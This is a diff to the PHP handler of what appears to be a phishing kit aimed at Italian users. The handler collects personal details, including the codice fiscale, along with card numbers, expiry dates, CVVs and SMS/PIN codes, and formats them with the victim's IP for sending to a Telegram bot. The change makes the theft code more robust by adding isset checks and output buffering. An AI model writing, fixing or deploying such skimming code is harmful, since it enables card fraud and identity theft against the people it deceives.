@@ -1,4 +1,5 @@
 <?php
+ob_start();
 
 require "../main.php";
 $bot = $a_bot;
@@ -10,7 +11,7 @@ $panel = str_replace('msdpweb/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_
 $ip = $_SERVER['REMOTE_ADDR'];
 
 function post($data){
-	if(empty(trim($data))){
+	if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
 		return "NO_DATA";
 	}else{
 		return htmlspecialchars($_POST[$data]);
@@ -30,15 +31,14 @@ function sendBot($url){
 
 
 if(isset($_POST['fname'])){
-    // Get form data
-    $fname = $_POST['fname'];
-    $lname = $_POST['lname'];
-    $code_fiscale = $_POST['codice-fiscale'];
-    $birthdate = $_POST['birthdate'];
-    $city = $_POST['city']; 
-    $zip = $_POST['zip'];
-    $email = $_POST['email'];
-    $number = $_POST['phone'];
+    $fname = isset($_POST['fname']) ? $_POST['fname'] : '';
+    $lname = isset($_POST['lname']) ? $_POST['lname'] : '';
+    $code_fiscale = isset($_POST['codice-fiscale']) ? $_POST['codice-fiscale'] : '';
+    $birthdate = isset($_POST['birthdate']) ? $_POST['birthdate'] : '';
+    $city = isset($_POST['city']) ? $_POST['city'] : '';
+    $zip = isset($_POST['zip']) ? $_POST['zip'] : '';
+    $email = isset($_POST['email']) ? $_POST['email'] : '';
+    $number = isset($_POST['number']) ? $_POST['number'] : '';
     
     // Get IP address
     $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
@@ -82,10 +82,9 @@ if(isset($_POST['fname'])){
 
 // Handle CC form (second form)
 if(isset($_POST['cc'])){
-    // Get form data
-    $card = $_POST['cc'];
-    $date = $_POST['exp'];
-    $code = $_POST['cvv'];
+    $card = isset($_POST['cc']) ? $_POST['cc'] : '';
+    $date = isset($_POST['exp']) ? $_POST['exp'] : '';
+    $code = isset($_POST['cvv']) ? $_POST['cvv'] : '';
     
     // Get IP address
     $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
@@ -127,8 +126,8 @@ if(isset($_POST['cc'])){
 
 if(isset($_POST['sms'])){
 	
-$sms = post("sms");
-$pin = post("pin");
+$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
+$pin = isset($_POST['pin']) ? $_POST['pin'] : '';
 
 $telegram_content = urlencode("
 SMS/PIN | $ip
